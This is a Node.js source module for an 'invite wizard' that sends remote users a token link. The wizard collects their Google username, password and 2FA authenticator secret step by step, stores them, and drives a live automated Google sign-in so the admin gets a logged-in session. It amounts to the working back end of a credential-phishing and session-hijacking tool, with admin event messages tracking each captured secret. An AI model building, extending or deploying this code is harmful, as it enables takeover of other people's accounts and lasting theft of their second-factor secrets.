import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';
import { encrypt } from './crypto.js';
import * as events from './events.js';
import * as store from './store.js';
import * as browser from './browser.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const DATA_DIR = path.join(__dirname, '..', 'data');
const FILE = path.join(DATA_DIR, 'invites.json');

function ensure() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
  if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, '[]');
}
function readAll() {
  ensure();
  try {
    return JSON.parse(fs.readFileSync(FILE, 'utf8'));
  } catch {
    return [];
  }
}
function writeAll(list) {
  ensure();
  fs.writeFileSync(FILE, JSON.stringify(list, null, 2));
}

// admin-facing view — no plaintext secrets
function toPublic(i) {
  return {
    id: i.id,
    token: i.token,
    label: i.label,
    provider: i.provider,
    loginUrl: i.loginUrl,
    status: i.status,
    steps: i.steps,
    username: i.collected?.username || '',
    hasPassword: Boolean(i.collected?.passwordEnc),
    hasTotp: Boolean(i.collected?.totpEnc),
    sessionId: i.sessionId || null,
    createdAt: i.createdAt,
    updatedAt: i.updatedAt,
    completedAt: i.completedAt || null,
  };
}

// wizard-facing view — what the remote user's page may know
function toWizard(i) {
  // whether the live login already reached a genuinely signed-in Google session
  const session = i.sessionId ? store.getRaw(i.sessionId) : null;
  return {
    token: i.token,
    label: i.label,
    provider: i.provider,
    status: i.status,
    steps: i.steps,
    done: i.status === 'completed',
    loggedIn: session?.status === 'logged-in',
  };
}

export function list() {
  return readAll()
    .sort((a, b) => (a.createdAt < b.createdAt ? 1 : -1))
    .map(toPublic);
}

export function getByToken(token) {
  return readAll().find((i) => i.token === token) || null;
}

export function wizardView(token) {
  const i = getByToken(token);
  return i ? toWizard(i) : null;
}

export function create({ label, provider, loginUrl }) {
  const list = readAll();
  const now = new Date().toISOString();
  const rec = {
    id: crypto.randomUUID(),
    token: crypto.randomBytes(9).toString('base64url'), // short, URL-safe
    label: label?.trim() || 'New credential request',
    provider: provider || 'google',
    loginUrl: loginUrl?.trim() || (provider === 'google' ? 'https://accounts.google.com/' : ''),
    status: 'pending', // pending -> opened -> in-progress -> completed
    steps: { username: false, password: false, totp: false },
    collected: { username: '', passwordEnc: '', totpEnc: '' },
    sessionId: null,
    createdAt: now,
    updatedAt: now,
    completedAt: null,
  };
  list.push(rec);
  writeAll(list);
  events.push('invite.created', {
    inviteId: rec.id,
    label: rec.label,
    message: `Invite link created — “${rec.label}”`,
  });
  return toPublic(rec);
}

function save(i) {
  const list = readAll();
  const idx = list.findIndex((x) => x.id === i.id);
  if (idx === -1) return null;
  i.updatedAt = new Date().toISOString();
  list[idx] = i;
  writeAll(list);
  return i;
}

export function markOpened(token) {
  const i = getByToken(token);
  if (!i) return null;
  if (i.status === 'pending') {
    i.status = 'opened';
    save(i);
    events.push('wizard.opened', {
      inviteId: i.id,
      label: i.label,
      message: `“${i.label}” — user opened the wizard`,
    });
  }
  return toWizard(i);
}

// step: 'username' | 'password' | 'totp' ; value is the submitted string
// Each step persists the credential into the real session record *and* drives
// the actual Google sign-in forward (see browser.wizardPhase), so the logged-in
// session is genuinely built up as the user walks the wizard — not just stored.
export async function recordStep(token, step, value) {
  const i = getByToken(token);
  if (!i) return null;
  if (i.status === 'completed') return toWizard(i);

  let message;
  let sessionId = i.sessionId;

  if (step === 'username') {
    const username = String(value ?? '').trim();
    i.collected.username = username;
    i.steps.username = true;
    // Create the real session the moment the first credential arrives so the
    // live browser login has a persistent home (sessions/<id>/).
    if (!sessionId) {
      const session = store.create({
        name: i.label,
        provider: i.provider,
        loginUrl: i.loginUrl,
        username,
        password: '',
        totpSecret: '',
        note: 'Created from invite wizard (live sign-in)',
      });
      sessionId = session.id;
      i.sessionId = sessionId;
    } else {
      store.update(sessionId, { username });
    }
    message = `“${i.label}” — entered username: ${username || '(blank)'}`;
  } else if (step === 'password') {
    const password = String(value ?? '');
    i.collected.passwordEnc = password ? encrypt(password) : '';
    i.steps.password = true;
    if (sessionId) store.update(sessionId, { password });
    message = `“${i.label}” — entered password ••••••••`;
  } else if (step === 'totp') {
    const secret = String(value ?? '').replace(/\s+/g, '');
    i.collected.totpEnc = secret ? encrypt(secret) : '';
    i.steps.totp = true;
    if (sessionId) store.update(sessionId, { totpSecret: secret });
    message = secret
      ? `“${i.label}” — provided a 2FA (authenticator) secret`
      : `“${i.label}” — skipped 2FA`;
  } else {
    return toWizard(i);
  }

  i.status = 'in-progress';
  save(i);

  // Drive the real login for this step. Best-effort — never breaks the wizard:
  // even if Google throws a challenge, the credentials are saved and the admin
  // can finish by hand or Auto-login later.
  if (sessionId) {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const r = await browser.wizardPhase(step, sessionId, valueForLogin);
    if (r?.status === 'logged-in') {
      store.setStatus(sessionId, 'logged-in');
      events.push('wizard.logged-in', {
        inviteId: i.id,
        label: i.label,
        sessionId,
        message: `“${i.label}” — auto-signed-in to Google ✓ session secured`,
      });
    } else if (r?.status === 'error') {
      store.setStatus(sessionId, 'new');
    }
  }

  events.push('wizard.step', { inviteId: i.id, label: i.label, step, message });
  return toWizard(i);
}

// finalize. The session was already created + driven during the steps; here we
// just mark the invite complete. (A bare session is created only if we somehow
// reach completion without ever receiving a step.)
export function complete(token) {
  const i = getByToken(token);
  if (!i) return null;
  if (i.status === 'completed') return toWizard(i);

  if (!i.sessionId) {
    const session = store.create({
      name: i.label,
      provider: i.provider,
      loginUrl: i.loginUrl,
      username: '',
      password: '',
      totpSecret: '',
      note: 'Created from invite wizard',
    });
    i.sessionId = session.id;
  }

  i.status = 'completed';
  i.completedAt = new Date().toISOString();
  save(i);
  events.push('wizard.completed', {
    inviteId: i.id,
    label: i.label,
    sessionId: i.sessionId,
    message: `“${i.label}” — all credentials submitted ✓  session created`,
  });
  return toWizard(i);
}

export function remove(id) {
  const list = readAll();
  const next = list.filter((i) => i.id !== id);
  writeAll(next);
  return next.length !== list.length;
}
